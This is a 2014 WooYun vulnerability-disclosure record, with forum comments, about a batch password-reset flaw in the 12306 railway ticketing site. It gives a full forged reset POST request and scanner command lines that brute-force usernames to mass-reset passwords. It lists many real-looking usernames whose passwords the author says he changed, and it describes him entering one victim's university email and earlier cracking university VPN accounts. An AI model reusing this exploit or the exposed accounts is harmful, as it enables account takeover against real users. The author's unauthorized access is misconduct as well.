{"id": 3659, "wybug_id": "wooyun-2014-063813", "wybug_title": "演示12306批量重置密码漏洞（可修改多个用户密码）", "wybug_corp": "中国铁道科学研究院", "wybug_author": "lijiejie", "wybug_date": "2014-06-06 21:13", "wybug_open_date": "2014-06-11 14:41", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-11：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 之前提给12306的漏洞被忽略了：http://www.wooyun.org/bugs/wooyun-2014-063025，哥还是详细演示下利用方法吧。。。  详细说明：  利用之前ping一下kyfw.12306.cn，然后修改hosts，固定解析到该IP。POST：\nPOST /otn/forgetPassword/findPasswordByPromptAnswer HTTP/1.1Host: kyfw.12306.cnConnection: keep-aliveContent-Length: 228Accept: application/json, text/javascript, */*; q=0.01Origin: https://kyfw.12306.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: https://kyfw.12306.cn/otn/forgetPassword/initforgetMyPasswordAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: JSESSIONID=0A1E82A1441AF4843295A39FF9A11E51; BIGipServerotn=2362704138.38945.0000userDTO.loginUserDTO.user_name=anfeng&userDTO.pwd_question=%E6%82%A8%E7%9A%84%E5%87%BA%E7%94%9F%E5%9C%B0%E6%98%AF%EF%BC%9F&userDTO.pwd_answer=%E4%B8%8A%E6%B5%B7&userDTO.password_new=test123&confirmPassWord=test123&randCodes=u6hc\n其中session id和randCodes根据自己的值修改即可。下载哥写的脚本（http://www.lijiejie.com/htpwdscan-http-weakpass-scanner/），分别执行：\nhtpwdScan.py -f=post12306.txt -https -d userDTO.loginUserDTO.user_name=pinyin2.txt -err=existError\\\":\\\"Y -debug\n\nhtpwdScan.py -f=post12306.txt -https -d userDTO.loginUserDTO.user_name=C:/cygwin/home/pinyin2.txt -err=existError\\\":\\\"Y -o=12306.txt\n在12306.txt中，你可以得到密码已经被修改为test123的用户们。上面的HTTP请求中，可以为答案设置额外的字典。   漏洞证明：  以下账号密码都被修改为test123，不信你试几个？\naidonganfengbanbingbangkabaoquanbianfangbingercaituocaizhicaorunchaifangchangyanchaoangchaoweichendiuchenningchensichengnachonglaichuaizhuochuandanconghuacuanzhengcuixingcuizhoudaidongdequandengyangdiexiandouniangdugongduangangdunpaifanleifeigengdouzhuogainaigaishugangqingeninggeixiaogennenggongneiguainianguaizheguanshuangguangpinnuanxiaopaizhangpangaipanleipangaipangshepaogaopeizhipinsanqianduanqieshuangqingnengqiujingquliangquemeiquexinqundaoranjingrenminrilangrongzhairouranruanleiruannansanshoushalengshaiyanshangdaoshangjishaohongshenpingshenshuoshigunshijiashijingshudunshuxinshuagunshunshaisongansuibiansunjinsunjingsuoguatangxiongtianmatinglengtongdiantuibiantuirongwaizhanwanchenwangrongweineiwenlanxianglongxiaofeixiaoqinxiaosaxiaosongxiechongxingguxingzangxiongfangxiongkaixiupaoxiuzuoxuanlixunxunyajingyanchenyangsayaoyunyilangyinmeiyouhangyuangengyueyongzanchengzangnuozaolingzhailizhaizangzhaokuanzhaoyingzhengengzhengjinzhipianzhongshuizhubiaozhuyuanzhuawozhuaichuzhuanghongzongcaizongnuozouyingzuzhengzuolouzuoshabantanbenqiaobiaonengbinqianbingduibochuiboqingcangjiachajiechaqinchanxunchefengchenyinchengfuchengliuchixiangchuliachupingchuzhuangchuangchucichancilingcuiniaodaigangdaipindanjindangleideisengdengfudengzhoudielaodiemeidinglindingludingpandingyueduhuaidumingduanzhaoduotuanensengfanghaifeichenfenghongfengleifoguangfufanggennieguasanguaihaguanyuehaqinghaxiaohanchuihanghaohangzhenheiqiahentonghongtianhoubinhujionghuadinghuangfanghuangleihuanglihuogongjipingjiarengjiangqiangjiaochujiehuajiepanjieyingjinpiejinrenjingchuanjiongbaijiongxujuchaijuanfangjueruankanminkangrunkaoshikaosunkaowenkejiankekongkengshenkuaiyingkuikaikuipinlandielanmielansenglaomaileiqiuleixialenghailiaminliaqionglianfulinneiliuzhangloujueluqinglushenmaigangmehuanmeiwangmengunmengbaimengdamengrenmieduanmindongnaidaonanlannanrongnengniuniaorongnielingningdenongzhangnuoliangoushoupaiyaopangcengpangniangpangwupishenpinqiaoqiahuaqianshuqiaojiongqinxunqingsuoqiongfaqionggeqiuranquanjiaoquepengquetongqunkangrexuanrenqianrengrenrongxurouzhouruanminruoshunshaqingshazhongshanhaishanlianshanshuangshanxunshaoyinshendianshennanshensuanshengjunshihuanshihuashineishujiushuaxiongshuimashunjingtaikuitenggangtengyongtizhengtiewangtongnuotongshantuixiutuorenwaichouwanpingweihongweisheiwensuowosengxiashunxiannianxiantuxiangmaxiaolingxiemingxingzhongyanyinyaosangyingcaiyinggongyingnongyoumeiyunniuyunpianzaidouzaijiaozaoshenzeifangzeishuizenningzhashezhaozhongzhegenzhenzenzhibangzhihuazhihaozhuzhongzhuachenzhuangchunzhuangyezongjunzongzongzunkun\n我随便挑了个账号进去看（对天发誓，中间随便挑的），一看，居然是清华邮箱啊。 随手拿电话号登录邮箱，轻轻松松登录进入了，额。。。 鉴于早就破解了清华北大的VPN账号若干，就没有必要继续玩清华了\n\n\n\n   修复方案：  你们更专业   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2014-06-09 08:24 厂商回复： 谢谢 最新状态： 2014-06-11：已经修复，多谢！  ", "replys": "漏洞评价：\n评论\n     2014-06-06 21:17 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2014-06-06 21:20 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  top~    \n     2014-06-06 21:36 |    \t\t迦南 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:11        | 我不是玩黑，我就是认真)\t\t \n  奖励春运火车票一张    \n     2014-06-06 21:36 |    \t\t野驴~ \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 充满强烈好奇心的菜鸟。)\t\t \n  楼下如何看？    \n     2014-06-06 21:57 |    \t\tSiro \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:11        | )    <Freedom />    (Fuck)\t\t \n  坐等学习思路……    \n     2014-06-06 22:49 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  欢迎打脸。。    \n     2014-06-06 23:47 |    \t\t李旭敏 \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:71        | ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎...)\t\t \n  楼主不拿rank不死心啊    \n     2014-06-07 09:03 |    \t\t小杰 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 低调的一个人)\t\t \n  洞主这是作死的节奏啊，这不是给12306查水表的借口吗。    \n     2014-06-07 11:36 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  楼主，打人是不打脸的，低调    \n     2014-06-11 14:56 |    \t\tnony \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:13        | Not do is die...)\t\t \n  楼主出门的时候  穿好防弹衣  戴好头盔神马的    \n     2014-06-11 15:03 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  “ 鉴于早就破解了清华北大的VPN账号若干，就没有必要继续玩清华了” ……洞主小心水表……    \n     2014-06-11 15:16 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  你们怎么都喜欢拿清华开刀，还把学生数据拖了好几遍，太过分了，shell都不分享    \n     2014-06-11 15:42 |    \t\t计算姬 \t\t\t( 普通白帽子  |\t\t\t        Rank:398 漏洞数:90        | 看我看我看我啊)\t\t \n  原理是什么    \n     2014-06-11 15:56 |    \t\t深蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:960 漏洞数:220        | 我们不是骇客，我们是黑客，我们维护互联网...)\t\t \n  下次拿北大开刀    \n     2014-06-11 16:10 |    \t\t风之传说 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:28        | 借用朋友的一句话，你的时间在哪里，你的成...)\t\t \n  good..    \n     2014-06-11 16:25 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  不要跟12306谈安全    \n     2014-06-11 16:48 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  鉴于早就破解了清华北大的VPN账号若干，就没有必要继续玩清华了    \n     2014-06-11 21:09 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  鉴于早就破解了清华北大的VPN账号若干，就没有必要继续玩清华了    \n     2014-06-12 10:44 |    \t\tzhangjie \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 我什么都不知道)\t\t \n  关键是这些帐号的密码还是 test123     \n     2014-06-14 00:10 |    \t\tLee Swagger \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:5        | 洗洗睡吧)\t\t \n  清华的数据库给拖了*  但是很多都不是核心的 lz进入主干的节奏？    \n     2014-06-19 11:15 |    \t\tIT偏执狂 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 禁锢我们的究竟是什么？)\t\t \n  关键是这些帐号的密码还是 test123    \n     2014-06-19 15:07 |    \t\t西顾 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 保守主义，展元爱好者，啥都不会)\t\t \n  咚咚咚  开门  社区送温暖    \n     2014-06-23 16:05 |    \t\t蛋碎酱油 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | http://www.metasploit.com.cn)\t\t \n  学习学习    \n     2014-06-28 08:08 |    \t\tDoze \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 路人)\t\t \n  test123 还可用    \n     2014-06-28 09:40 |    \t\tlijiejie  \t\t\t( 核心白帽子 |\t\t\t        Rank:2210 漏洞数:294        | Just for fun.)\t\t \n  @Doze 可以看出，他们并不很重视用户的信息和数据    \n     2014-06-28 17:00 |    \t\thawkeye \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 关注安全)\t\t \n   楼主   做等水表了    \n     2014-07-01 15:04 |    \t\t芙兰朵露斯卡雷特 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 看我闪现逃走闪现逃走六不六)\t\t \n  no zuo no die why you try    \n     2014-07-12 12:56 |    \t\tStarBrilliant \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | (null))\t\t \n  这打码打得……肉眼都能看见啊……    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}